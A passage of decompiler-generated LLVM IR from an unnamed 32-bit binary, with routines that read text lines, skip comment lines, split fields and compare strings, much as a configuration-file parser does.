  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 4, 3, 1, 5, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 15, 5, 6, 7, 10, 8, 9, 11, 12, 13, 14, 1, 16, 18, 0, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000ec70, { 1, 4, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000eca8, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 101, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000ebcc, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000ed5c, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @function_1000e800, { 0, 3, 2, 1 }
  uselistorder i32 53, { 3, 0, 1, 2 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_1000e004, { 2, 1, 0, 3 }
  uselistorder i16* @global_var_1002b86c.804, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 7, 11, 1, 2, 3, 8, 9, 10, 4, 6, 5, 0 }
  uselistorder label %dec_label_pc_10011f64, { 1, 0 }
  uselistorder label %dec_label_pc_10011f34, { 1, 0 }
  uselistorder label %dec_label_pc_10011f04, { 1, 0 }
  uselistorder label %dec_label_pc_10011ef4, { 1, 0 }
  uselistorder label %dec_label_pc_10011ee4, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_100119c0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10011ec8, { 1, 0 }
  uselistorder label %dec_label_pc_10011eb0, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10011eccthread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011e58, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10011e30, { 1, 0 }
  uselistorder label %dec_label_pc_10011e0c, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10011e04, { 1, 0 }
  uselistorder label %dec_label_pc_10011df0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10011d5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011c98, { 1, 0 }
  uselistorder label %dec_label_pc_10011c90, { 1, 0 }
  uselistorder label %dec_label_pc_10011b34, { 1, 0 }
  uselistorder label %dec_label_pc_10011aac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100119d0, { 1, 0 }
}

define i32 @function_10011f7c() local_unnamed_addr {
dec_label_pc_10011f7c:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10011f98 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10011f98, i32* @r3, align 4
  %v0_10011fa4 = call i32 @function_10010048()
  store i32 ptrtoint (i32* @global_var_1002b870.749 to i32), i32* %r3.global-to-local, align 4
  %v0_10011fac = call i32 @function_10010040()
  store i32 %v0_10011fac, i32* %r3.global-to-local, align 4
  %v3_10011fb4 = load i32, i32* @global_var_1002b964.751, align 4
  %v2_10011fb8 = icmp sgt i32 %v3_10011fb4, 0
  br i1 %v2_10011fb8, label %dec_label_pc_10012230, label %dec_label_pc_10011fc0

dec_label_pc_10011fc0:                            ; preds = %dec_label_pc_10011f7c
  store i32 ptrtoint ([17 x i8]* @global_var_1001a4f8.817 to i32), i32* %r3.global-to-local, align 4
  store i32 268509144, i32* @lr, align 4
  %v3_10011fd4 = call i32 @function_100126e8(i32 ptrtoint ([17 x i8]* @global_var_1001a4f8.817 to i32), i32 ptrtoint (i32* @global_var_1001a50c.816 to i32))
  store i32 %v3_10011fd4, i32* %r3.global-to-local, align 4
  store i32 %v3_10011fd4, i32* @r26, align 4
  %v3_10011fd8 = icmp eq i32 %v3_10011fd4, 0
  br i1 %v3_10011fd8, label %dec_label_pc_10011fe0, label %dec_label_pc_100121f4.preheader

dec_label_pc_10011fe0:                            ; preds = %dec_label_pc_10011fc0
  %v0_10011fe4 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001a510.818 to i32), i32* %r3.global-to-local, align 4
  store i32 268509168, i32* @lr, align 4
  %v3_10011fec = call i32 @function_100126e8(i32 ptrtoint ([24 x i8]* @global_var_1001a510.818 to i32), i32 %v0_10011fe4)
  store i32 %v3_10011fec, i32* %r3.global-to-local, align 4
  store i32 %v3_10011fec, i32* @r26, align 4
  %v3_10011ff0 = icmp eq i32 %v3_10011fec, 0
  br i1 %v3_10011ff0, label %dec_label_pc_10012224, label %dec_label_pc_100121f4.preheader

dec_label_pc_100121f4.preheader:                  ; preds = %dec_label_pc_10011fc0, %dec_label_pc_10011fe0
  %v0_1001220016 = phi i32 [ %v3_10011fd4, %dec_label_pc_10011fc0 ], [ %v3_10011fec, %dec_label_pc_10011fe0 ]
  %v2_100121f4 = ptrtoint i32* %stack_var_-164 to i32
  %v1_100120002 = bitcast i32* %stack_var_-164 to i8*
  %v3_100120e4 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_100121f4

dec_label_pc_10011ffc:                            ; preds = %dec_label_pc_10012014
  %v1_10011ffc = add i32 %v0_100120bc9, 1
  store i32 %v1_10011ffc, i32* %r3.global-to-local, align 4
  %v1_10012000 = inttoptr i32 %v1_10011ffc to i8*
  %v2_10012000 = load i8, i8* %v1_10012000, align 1
  %v3_10012000 = zext i8 %v2_10012000 to i32
  store i32 %v3_10012000, i32* %r11.global-to-local, align 4
  %v3_10012008 = icmp eq i8 %v2_10012000, 0
  br i1 %v3_10012008, label %dec_label_pc_100121f4.backedge, label %dec_label_pc_10012014

dec_label_pc_10012014:                            ; preds = %dec_label_pc_10012014.lr.ph, %dec_label_pc_10011ffc
  %v0_10012018.in = phi i32 [ %v3_100120004, %dec_label_pc_10012014.lr.ph ], [ %v3_10012000, %dec_label_pc_10011ffc ]
  %v0_1001202c = phi i32 [ %v3_100120004, %dec_label_pc_10012014.lr.ph ], [ %v3_10012000, %dec_label_pc_10011ffc ]
  %v0_100120bc9 = phi i32 [ %v2_100121f4, %dec_label_pc_10012014.lr.ph ], [ %v1_10011ffc, %dec_label_pc_10011ffc ]
  %v0_10012018 = mul nuw nsw i32 %v0_10012018.in, 2
  %v2_10012018 = add i32 %v0_10012018, %v3_10012014.pre
  %v3_10012018 = inttoptr i32 %v2_10012018 to i16*
  %v4_10012018 = load i16, i16* %v3_10012018, align 2
  %v1_1001201c = and i16 %v4_10012018, 32
  %v3_1001201c = icmp eq i16 %v1_1001201c, 0
  br i1 %v3_1001201c, label %dec_label_pc_10012024, label %dec_label_pc_10011ffc

dec_label_pc_10012024:                            ; preds = %dec_label_pc_10012014
  %v3_10012024 = icmp eq i32 %v0_1001202c, 10
  br i1 %v3_10012024, label %dec_label_pc_100121f4.backedge, label %dec_label_pc_1001202c

dec_label_pc_100121f4.backedge:                   ; preds = %dec_label_pc_10011ffc, %dec_label_pc_100121a8, %dec_label_pc_100121b0, %dec_label_pc_100121e8, %dec_label_pc_10012000.preheader, %dec_label_pc_10012024, %dec_label_pc_1001202c, %dec_label_pc_10012150
  %v0_10012200.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_100121f4

dec_label_pc_1001202c:                            ; preds = %dec_label_pc_10012024
  %v3_1001202c = icmp eq i32 %v0_1001202c, 35
  br i1 %v3_1001202c, label %dec_label_pc_100121f4.backedge, label %dec_label_pc_10012034

dec_label_pc_10012034:                            ; preds = %dec_label_pc_1001202c
  store i32 0, i32* @r27, align 4
  store i32 %v2_10011f98, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100120bc10 = inttoptr i32 %v0_100120bc9 to i8*
  %v2_100120bc11 = load i8, i8* %v1_100120bc10, align 1
  %v3_100120c014 = icmp eq i8 %v2_100120bc11, 0
  br i1 %v3_100120c014, label %dec_label_pc_100120d0, label %dec_label_pc_100120c8

dec_label_pc_10012048:                            ; preds = %dec_label_pc_100120c8
  %v3_10012048 = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_10012048, i32* %r11.global-to-local, align 4
  %v1_1001204c = mul i32 %v0_1001204c, 4
  %v1_10012050 = load i32, i32* %r6.global-to-local, align 4
  %v2_10012050 = add i32 %v1_10012050, %v1_1001204c
  %v2_10012054 = add i32 %v2_10012050, 16
  %v3_10012054 = inttoptr i32 %v2_10012054 to i32*
  store i32 %v0_10012054, i32* %v3_10012054, align 4
  %v0_10012060.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012060

dec_label_pc_1001205c:                            ; preds = %dec_label_pc_10012074
  %v1_1001205c = add i32 %v0_1001205c, 1
  store i32 %v1_1001205c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012060

dec_label_pc_10012060:                            ; preds = %dec_label_pc_10012048, %dec_label_pc_1001205c
  %v0_1001205c = phi i32 [ %v0_10012060.pre, %dec_label_pc_10012048 ], [ %v1_1001205c, %dec_label_pc_1001205c ]
  %v1_10012060 = inttoptr i32 %v0_1001205c to i8*
  %v2_10012060 = load i8, i8* %v1_10012060, align 1
  %v3_10012064 = icmp eq i8 %v2_10012060, 0
  br i1 %v3_10012064, label %dec_label_pc_10012090, label %dec_label_pc_10012074

dec_label_pc_10012074:                            ; preds = %dec_label_pc_10012060
  %v3_1001206c = icmp eq i8 %v2_10012060, 10
  %v3_10012060 = zext i8 %v2_10012060 to i32
  %v1_10012068 = mul nuw nsw i32 %v3_10012060, 2
  %v1_10012074 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012074 = add i32 %v1_10012074, %v1_10012068
  %v3_10012074 = inttoptr i32 %v2_10012074 to i16*
  %v4_10012074 = load i16, i16* %v3_10012074, align 2
  %v1_10012078 = and i16 %v4_10012074, 32
  %v3_10012078.not = icmp ne i16 %v1_10012078, 0
  %brmerge = or i1 %v3_1001206c, %v3_10012078.not
  br i1 %brmerge, label %dec_label_pc_10012090, label %dec_label_pc_1001205c

dec_label_pc_10012088:                            ; preds = %dec_label_pc_100120a4
  %v0_10012088 = load i32, i32* %r7.global-to-local, align 4
  %v1_10012088 = trunc i32 %v0_10012088 to i8
  store i8 %v1_10012088, i8* %v1_10012090, align 1
  %v0_1001208c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001208c = add i32 %v0_1001208c, 1
  store i32 %v1_1001208c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012090

dec_label_pc_10012090:                            ; preds = %dec_label_pc_10012074, %dec_label_pc_10012060, %dec_label_pc_10012088
  %v0_100120bc = phi i32 [ %v1_1001208c, %dec_label_pc_10012088 ], [ %v0_1001205c, %dec_label_pc_10012060 ], [ %v0_1001205c, %dec_label_pc_10012074 ]
  %v1_10012090 = inttoptr i32 %v0_100120bc to i8*
  %v2_10012090 = load i8, i8* %v1_10012090, align 1
  %v3_10012090 = zext i8 %v2_10012090 to i32
  %v3_10012094 = icmp eq i8 %v2_10012090, 0
  %v1_10012098 = mul nuw nsw i32 %v3_10012090, 2
  store i32 %v1_10012098, i32* %r11.global-to-local, align 4
  br i1 %v3_10012094, label %dec_label_pc_100120b8, label %dec_label_pc_100120a4

dec_label_pc_100120a4:                            ; preds = %dec_label_pc_10012090
  %v3_1001209c = icmp eq i8 %v2_10012090, 10
  %v3_100120a4 = load i32, i32* @global_var_1002b8c0, align 4
  %v2_100120a8 = add i32 %v3_100120a4, %v1_10012098
  %v3_100120a8 = inttoptr i32 %v2_100120a8 to i16*
  %v4_100120a8 = load i16, i16* %v3_100120a8, align 2
  %v1_100120ac = and i16 %v4_100120a8, 32
  %v3_100120ac.not = icmp ne i16 %v1_100120ac, 0
  %brmerge27 = or i1 %v3_1001209c, %v3_100120ac.not
  br i1 %brmerge27, label %dec_label_pc_10012088, label %dec_label_pc_100120b8

dec_label_pc_100120b8:                            ; preds = %dec_label_pc_100120a4, %dec_label_pc_10012090
  %v0_100120b8 = load i32, i32* @r27, align 4
  %v1_100120b8 = add i32 %v0_100120b8, 1
  store i32 %v1_100120b8, i32* @r27, align 4
  %v2_100120bc = load i8, i8* %v1_10012090, align 1
  %v3_100120c0 = icmp eq i8 %v2_100120bc, 0
  br i1 %v3_100120c0, label %dec_label_pc_100120d0, label %dec_label_pc_100120c8

dec_label_pc_100120c8:                            ; preds = %dec_label_pc_10012034, %dec_label_pc_100120b8
  %v0_10012054 = phi i32 [ %v0_100120bc, %dec_label_pc_100120b8 ], [ %v0_100120bc9, %dec_label_pc_10012034 ]
  %v0_1001204c = phi i32 [ %v1_100120b8, %dec_label_pc_100120b8 ], [ 0, %dec_label_pc_10012034 ]
  %tmp33 = icmp slt i32 %v0_1001204c, 5
  br i1 %tmp33, label %dec_label_pc_10012048, label %dec_label_pc_100120d0

dec_label_pc_100120d0:                            ; preds = %dec_label_pc_100120b8, %dec_label_pc_100120c8, %dec_label_pc_10012034
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1001a528.819 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_100120e4 = call i32 @function_1000df0c(i8* %v3_100120e4, i32 ptrtoint ([11 x i8]* @global_var_1001a528.819 to i32))
  store i32 %v4_100120e4, i32* %r3.global-to-local, align 4
  %v3_100120e8 = icmp eq i32 %v4_100120e4, 0
  br i1 %v3_100120e8, label %dec_label_pc_10012114, label %dec_label_pc_10012138

dec_label_pc_100120f4:                            ; preds = %dec_label_pc_1001212c
  %v1_100120f4 = add i32 %v2_1001211c, 24
  %v2_100120f4 = inttoptr i32 %v1_100120f4 to i32*
  %v3_100120f4 = load i32, i32* %v2_100120f4, align 4
  store i32 %v3_100120f4, i32* %r3.global-to-local, align 4
  store i32 268509436, i32* @lr, align 4
  %v1_100120f8 = call i32 @function_10013230(i32 %v3_100120f4)
  store i32 %v1_100120f8, i32* %r3.global-to-local, align 4
  %v0_10012100 = load i32, i32* @r29, align 4
  %v1_10012100 = add i32 %v0_10012100, 1
  store i32 %v1_10012100, i32* %r11.global-to-local, align 4
  %v1_10012104 = mul i32 %v0_10012100, 4
  store i32 %v1_10012100, i32* @global_var_1002b964.751, align 4
  %v3_10012110 = add i32 %v1_10012104, ptrtoint (i32* @global_var_10031c60.752 to i32)
  %v4_10012110 = inttoptr i32 %v3_10012110 to i32*
  store i32 %v1_100120f8, i32* %v4_10012110, align 4
  br label %dec_label_pc_10012114

dec_label_pc_10012114:                            ; preds = %dec_label_pc_100120d0, %dec_label_pc_100120f4
  %v0_10012114 = load i32, i32* @r31, align 4
  %v1_10012114 = load i32, i32* @r27, align 4
  %v2_10012114 = icmp slt i32 %v0_10012114, %v1_10012114
  %v1_10012118 = mul i32 %v0_10012114, 4
  %v0_1001211c = load i32, i32* @r1, align 4
  %v2_1001211c = add i32 %v0_1001211c, %v1_10012118
  br i1 %v2_10012114, label %dec_label_pc_1001212c, label %dec_label_pc_10012138

dec_label_pc_1001212c:                            ; preds = %dec_label_pc_10012114
  %v3_1001212c = load i32, i32* @global_var_1002b964.751, align 4
  %tmp35 = icmp slt i32 %v3_1001212c, 3
  br i1 %tmp35, label %dec_label_pc_100120f4, label %dec_label_pc_10012138

dec_label_pc_10012138:                            ; preds = %dec_label_pc_1001212c, %dec_label_pc_10012114, %dec_label_pc_100120d0
  %v0_1001213c = load i32, i32* @r30, align 4
  store i32 %v0_1001213c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a534.820 to i32), i32* @r4, align 4
  %v3_10012144 = inttoptr i32 %v0_1001213c to i8*
  %v4_10012144 = call i32 @function_1000df0c(i8* %v3_10012144, i32 ptrtoint ([7 x i8]* @global_var_1001a534.820 to i32))
  store i32 %v4_10012144, i32* %r3.global-to-local, align 4
  %v3_10012148 = icmp eq i32 %v4_10012144, 0
  br i1 %v3_10012148, label %dec_label_pc_10012188.preheader, label %dec_label_pc_10012150

dec_label_pc_10012150:                            ; preds = %dec_label_pc_10012138
  %v0_10012154 = load i32, i32* @r30, align 4
  store i32 %v0_10012154, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a53c.821 to i32), i32* @r4, align 4
  %v3_1001215c = inttoptr i32 %v0_10012154 to i8*
  %v4_1001215c = call i32 @function_1000df0c(i8* %v3_1001215c, i32 ptrtoint ([7 x i8]* @global_var_1001a53c.821 to i32))
  store i32 %v4_1001215c, i32* %r3.global-to-local, align 4
  %v3_10012160 = icmp eq i32 %v4_1001215c, 0
  br i1 %v3_10012160, label %dec_label_pc_10012188.preheader, label %dec_label_pc_100121f4.backedge

dec_label_pc_10012188.preheader:                  ; preds = %dec_label_pc_10012138, %dec_label_pc_10012150
  store i32 ptrtoint (i32* @global_var_10031c50.808 to i32), i32* @r31, align 4
  %v3_1001219441 = load i32, i32* @global_var_1002b968.806, align 4
  %v2_1001219843 = icmp sgt i32 %v3_1001219441, 0
  %v1_1001219c45 = add i32 %v3_1001219441, -1
  %v1_100121a046 = mul i32 %v1_1001219c45, 4
  store i32 %v1_100121a046, i32* %r11.global-to-local, align 4
  br i1 %v2_1001219843, label %dec_label_pc_1001216c, label %dec_label_pc_100121a8

dec_label_pc_1001216c:                            ; preds = %dec_label_pc_10012188.preheader, %dec_label_pc_1001216c
  %v1_100121a048 = phi i32 [ %v1_100121a0, %dec_label_pc_1001216c ], [ %v1_100121a046, %dec_label_pc_10012188.preheader ]
  %v1_1001219c47 = phi i32 [ %v1_1001219c, %dec_label_pc_1001216c ], [ %v1_1001219c45, %dec_label_pc_10012188.preheader ]
  %v2_1001216c = add i32 %v1_100121a048, ptrtoint (i32* @global_var_10031c50.808 to i32)
  %v3_1001216c = inttoptr i32 %v2_1001216c to i32*
  %v4_1001216c = load i32, i32* %v3_1001216c, align 4
  store i32 %v4_1001216c, i32* %r3.global-to-local, align 4
  store i32 %v1_1001219c47, i32* @global_var_1002b968.806, align 4
  store i32 268509560, i32* @lr, align 4
  %v1_10012174 = call i32 @function_1000f0b8(i32 %v4_1001216c)
  store i32 %v1_10012174, i32* %r3.global-to-local, align 4
  %v3_10012178 = load i32, i32* @global_var_1002b968.806, align 4
  %v1_10012180 = mul i32 %v3_10012178, 4
  %v1_10012184 = load i32, i32* @r31, align 4
  %v3_10012184 = add i32 %v1_10012184, %v1_10012180
  %v4_10012184 = inttoptr i32 %v3_10012184 to i32*
  store i32 0, i32* %v4_10012184, align 4
  store i32 ptrtoint (i32* @global_var_10031c50.808 to i32), i32* @r31, align 4
  %v3_10012194 = load i32, i32* @global_var_1002b968.806, align 4
  %v2_10012198 = icmp sgt i32 %v3_10012194, 0
  %v1_1001219c = add i32 %v3_10012194, -1
  %v1_100121a0 = mul i32 %v1_1001219c, 4
  store i32 %v1_100121a0, i32* %r11.global-to-local, align 4
  br i1 %v2_10012198, label %dec_label_pc_1001216c, label %dec_label_pc_100121a8

dec_label_pc_100121a8:                            ; preds = %dec_label_pc_1001216c, %dec_label_pc_10012188.preheader
  %v3_100121e859 = phi i32 [ %v3_1001219441, %dec_label_pc_10012188.preheader ], [ %v3_10012194, %dec_label_pc_1001216c ]
  %v1_100121d049 = load i32, i32* @r27, align 4
  %v2_100121d050 = icmp sgt i32 %v1_100121d049, 1
  %v0_100121d853 = load i32, i32* @r1, align 4
  %v2_100121d854 = add i32 %v0_100121d853, 4
  br i1 %v2_100121d050, label %dec_label_pc_100121e8, label %dec_label_pc_100121f4.backedge

dec_label_pc_100121b0:                            ; preds = %dec_label_pc_100121e8
  %v1_100121b0 = add i32 %v2_100121d855, 24
  %v2_100121b0 = inttoptr i32 %v1_100121b0 to i32*
  %v3_100121b0 = load i32, i32* %v2_100121b0, align 4
  store i32 %v3_100121b0, i32* %r3.global-to-local, align 4
  store i32 268509624, i32* @lr, align 4
  %v1_100121b4 = call i32 @function_10013230(i32 %v3_100121b0)
  store i32 %v1_100121b4, i32* %r3.global-to-local, align 4
  %v0_100121bc = load i32, i32* @r29, align 4
  %v1_100121bc = add i32 %v0_100121bc, 1
  store i32 %v1_100121bc, i32* %r11.global-to-local, align 4
  %v1_100121c0 = mul i32 %v0_100121bc, 4
  store i32 %v1_100121bc, i32* @global_var_1002b968.806, align 4
  %v3_100121cc = add i32 %v1_100121c0, ptrtoint (i32* @global_var_10031c50.808 to i32)
  %v4_100121cc = inttoptr i32 %v3_100121cc to i32*
  store i32 %v1_100121b4, i32* %v4_100121cc, align 4
  %v0_100121d0.pre = load i32, i32* @r31, align 4
  %v1_100121d0 = load i32, i32* @r27, align 4
  %v2_100121d0 = icmp slt i32 %v0_100121d0.pre, %v1_100121d0
  br i1 %v2_100121d0, label %dec_label_pc_100121b0.dec_label_pc_100121e8_crit_edge, label %dec_label_pc_100121f4.backedge

dec_label_pc_100121b0.dec_label_pc_100121e8_crit_edge: ; preds = %dec_label_pc_100121b0
  %v0_100121d8 = load i32, i32* @r1, align 4
  %v1_100121d4 = mul i32 %v0_100121d0.pre, 4
  %v2_100121d8 = add i32 %v0_100121d8, %v1_100121d4
  %v3_100121e8.pre = load i32, i32* @global_var_1002b968.806, align 4
  br label %dec_label_pc_100121e8

dec_label_pc_100121e8:                            ; preds = %dec_label_pc_100121a8, %dec_label_pc_100121b0.dec_label_pc_100121e8_crit_edge
  %v3_100121e8 = phi i32 [ %v3_100121e8.pre, %dec_label_pc_100121b0.dec_label_pc_100121e8_crit_edge ], [ %v3_100121e859, %dec_label_pc_100121a8 ]
  %v2_100121d855 = phi i32 [ %v2_100121d8, %dec_label_pc_100121b0.dec_label_pc_100121e8_crit_edge ], [ %v2_100121d854, %dec_label_pc_100121a8 ]
  %tmp37 = icmp slt i32 %v3_100121e8, 4
  br i1 %tmp37, label %dec_label_pc_100121b0, label %dec_label_pc_100121f4.backedge

dec_label_pc_100121f4:                            ; preds = %dec_label_pc_100121f4.backedge, %dec_label_pc_100121f4.preheader
  %v0_10012200 = phi i32 [ %v0_10012200.pre, %dec_label_pc_100121f4.backedge ], [ %v0_1001220016, %dec_label_pc_100121f4.preheader ]
  store i32 %v2_100121f4, i32* %r3.global-to-local, align 4
  store i32 268509704, i32* @lr, align 4
  %v3_10012204 = call i32 @function_10012c34(i32 %v2_100121f4, i32 128, i32 %v0_10012200)
  store i32 %v3_10012204, i32* %r3.global-to-local, align 4
  %v3_10012208 = icmp eq i32 %v3_10012204, 0
  br i1 %v3_10012208, label %dec_label_pc_10012218, label %dec_label_pc_10012000.preheader

dec_label_pc_10012000.preheader:                  ; preds = %dec_label_pc_100121f4
  store i32 %v2_100121f4, i32* %r3.global-to-local, align 4
  %v2_100120003 = load i8, i8* %v1_100120002, align 4
  %v3_100120004 = zext i8 %v2_100120003 to i32
  store i32 %v3_100120004, i32* %r11.global-to-local, align 4
  %v3_100120086 = icmp eq i8 %v2_100120003, 0
  br i1 %v3_100120086, label %dec_label_pc_100121f4.backedge, label %dec_label_pc_10012014.lr.ph

dec_label_pc_10012014.lr.ph:                      ; preds = %dec_label_pc_10012000.preheader
  %v3_10012014.pre = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_10012014

dec_label_pc_10012218:                            ; preds = %dec_label_pc_100121f4
  %v0_10012218 = load i32, i32* @r26, align 4
  store i32 %v0_10012218, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012220.822 to i32), i32* @lr, align 4
  %v1_1001221c = inttoptr i32 %v0_10012218 to i16*
  %v2_1001221c = call i32 @function_1001259c(i16* %v1_1001221c)
  store i32 %v2_1001221c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012230

dec_label_pc_10012224:                            ; preds = %dec_label_pc_10011fe0
  %v0_10012224 = call i32 @function_1001063c()
  store i32 %v0_10012224, i32* %r3.global-to-local, align 4
  %v2_1001222c = inttoptr i32 %v0_10012224 to i32*
  store i32 3, i32* %v2_1001222c, align 4
  br label %dec_label_pc_10012230

dec_label_pc_10012230:                            ; preds = %dec_label_pc_10011f7c, %dec_label_pc_10012218, %dec_label_pc_10012224
  store i32 %v2_10011f98, i32* @r3, align 4
  %v0_10012238 = call i32 @function_10010048()
  store i32 %v0_10012238, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012238

; uselistorder directives
  uselistorder i32 %v3_100120004, { 2, 0, 1 }
  uselistorder i32 %v1_100121a046, { 1, 0 }
  uselistorder i32 %v1_1001219c45, { 1, 0 }
  uselistorder i32 %v0_1001204c, { 1, 0 }
  uselistorder i32 %v1_10012098, { 1, 0 }
  uselistorder i8* %v1_10012090, { 0, 2, 1 }
  uselistorder i8 %v2_10012060, { 2, 0, 1 }
  uselistorder i32 %v0_1001205c, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10012000, { 1, 0, 2 }
  uselistorder i32 %v1_10011ffc, { 0, 2, 1 }
  uselistorder i32 %v2_100121f4, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10011f98, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 1, 6, 3, 2, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 20, 0, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_1001063c, { 5, 4, 3, 2, 0, 1, 6 }
  uselistorder i32* @global_var_1002b968.806, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10031c50.808 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10031c60.752 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b870.749 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_10012230, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100121e8, { 1, 0 }
  uselistorder label %dec_label_pc_1001216c, { 1, 0 }
  uselistorder label %dec_label_pc_10012188.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10012114, { 1, 0 }
  uselistorder label %dec_label_pc_100120d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100120c8, { 1, 0 }
  uselistorder label %dec_label_pc_10012090, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012060, { 1, 0 }
  uselistorder label %dec_label_pc_100121f4.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_100121f4.preheader, { 1, 0 }
}

define i32 @function_10012250(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10012250:
  %stack_var_0 = alloca i32, align 4
  %v4_10012250 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268509844, i32* @lr, align 4
  %v9_10012290 = inttoptr i32 %arg3 to i32*
  %v10_10012290 = call i32 @function_10013d3c(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_10012290, i32 %arg4, i32 %arg5, i32 %v4_10012250, i32 %arg7)
  ret i32 %v10_10012290
}

define i32 @function_100122a8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100122a8:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_100122ac = load i32, i32* @lr, align 4
  store i32 %v0_100122ac, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100122b8 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_100122c8 = add i32 %tmp, 4
  store i32 %v1_100122c8, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_100122d0 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_100122d0, i32* @r3, align 4
  br i1 %v3_100122b8, label %dec_label_pc_100122f8, label %dec_label_pc_100122d8

dec_label_pc_100122d8:                            ; preds = %dec_label_pc_100122a8
  %v2_100122d8 = load i32, i32* %arg2, align 4
  store i32 %v2_100122d8, i32* %r0.global-to-local, align 4
  store i32 268509924, i32* @lr, align 4
  %v0_100122e0 = call i32 @function_1000dcb0()
  %v0_100122e4 = load i32, i32* @r31, align 4
  %v1_100122e4 = add i32 %v0_100122e4, 132
  %v2_100122e4 = inttoptr i32 %v1_100122e4 to i32*
  %v3_100122e4 = load i32, i32* %v2_100122e4, align 4
  store i32 %v3_100122e4, i32* %r0.global-to-local, align 4
